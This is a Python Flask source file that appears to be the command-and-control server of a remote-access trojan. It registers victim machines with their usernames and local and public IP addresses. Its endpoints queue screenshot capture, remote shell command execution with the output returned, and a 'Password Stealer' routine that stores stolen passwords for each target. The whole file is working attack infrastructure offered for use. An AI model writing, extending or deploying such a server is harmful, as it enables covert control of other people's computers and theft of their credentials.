import json
from token import COMMA
import flask
import os

from flask import Flask, request, jsonify
from flask_cors import CORS
import urllib.parse
import ast

current_directory = os.path.dirname(os.path.abspath(__file__))
users_directory = os.path.join(current_directory, 'Users', "User.json")

app = Flask(__name__)

CORS(app)

def create_data_folder():
    data_folder = f'{current_directory}/Users'
    if not os.path.exists(data_folder):
        try:
            os.makedirs(data_folder)
            print(f"Created 'data' folder at {data_folder}")
        except OSError as e:
            print(f"Error creating 'data' folder: {e}")
            
    if not os.path.exists(users_directory):
        with open(users_directory, "w") as file:
            json.dump({}, file, indent=4)
            
def get_user_data():
    with open(users_directory, "r") as file:
        data = json.load(file)
        
    return data

def writefile(data):
    with open(users_directory, "w") as file:
        json.dump(data, file, indent=4)
        
    return True

data = get_user_data()
if not 'command' in data:
    data["command"] = ""
    
writefile(data)

@app.route("/login", methods=["GET"])
def login():
    username = request.args.get("user", default="1", type=str)
    local_ip = request.args.get("ip", default="2", type=str)
    public_ip = request.args.get("public_ip", default="3", type=str)
    
    create_data_folder()
    
    data = get_user_data()
    if username not in data:
        data[username] = {}
    
    if 'commands' not in data[username]:
        data[username]['commands'] = {}

    data[username]["IP"] = local_ip
    data[username]["username"] = username
    data[username]["Public IP"] = public_ip

    writefile(data)

    return jsonify({"message": "Logged in!"})

@app.route("/commands", methods=["GET"])
def commands():
    username = request.args.get("user", default="1", type=str)
    
    data = get_user_data()

    return jsonify(data)

@app.route("/new_cmd", methods=["GET"])
def new_cmd():
    command = request.args.get("command", default="1", type=str)
    
    data = get_user_data()
    
    if command == "nil_":
        data["command"] = ""
    else:
        data["command"] = command
        
    writefile(data)

    return jsonify(data)



## COMMANDS ##

@app.route("/ss", methods=["GET"])
def ss():
    target = request.args.get("target", default="1", type=str)
    state = request.args.get("state", default="false", type=str).lower()
    
    data = get_user_data()
    
    data2 = data[target]
    
    commands = data2["commands"]
    
    if state == 'false':
        state = False
    elif state == 'true':
        state = True
        
    commands["ss"] = state
    
    writefile(data)
    
    return "Screen Shot initiated!"

@app.route("/exec", methods=["GET"])
def exe():
    target = request.args.get("target", default="1", type=str)
    command = request.args.get("command", default="", type=str)
    response = request.args.get("response", default="", type=str)
    
    if command == "nil_":
        command = ""
    if response == "nil_":
        response = ""
    
    data = get_user_data()
    
    data2 = data[target]
    
    commands = data2["commands"]
    
    commands["exec"] = {
            "command": command,
            "response": response
        }
    
    writefile(data)
    
    return "Command Execution initiated!"
    
@app.route("/passwords", methods=["GET"])
def passwords():
    target = request.args.get("target", default="1", type=str)
    state = request.args.get("state", default="false", type=str).lower()
    passwords_encoded = request.args.get("passwords", default="[]", type=str)

    if state == 'false':
        state = False
    if state == 'true':
        state = True

    # Decode the URL-encoded passwords parameter
    passwords_decoded = urllib.parse.unquote(passwords_encoded)
    # Convert the decoded string back to a list
    passwords = ast.literal_eval(passwords_decoded)

    data = get_user_data()
    data2 = data[target]
    commands = data2["commands"]
    
    commands["password"] = {
            "state": state,
            "passwords": passwords
        }
    
    writefile(data)
    
    return "Password Stealer initiated!"

if __name__ == "__main__":
    app.run("0.0.0.0", 8080, debug=True)
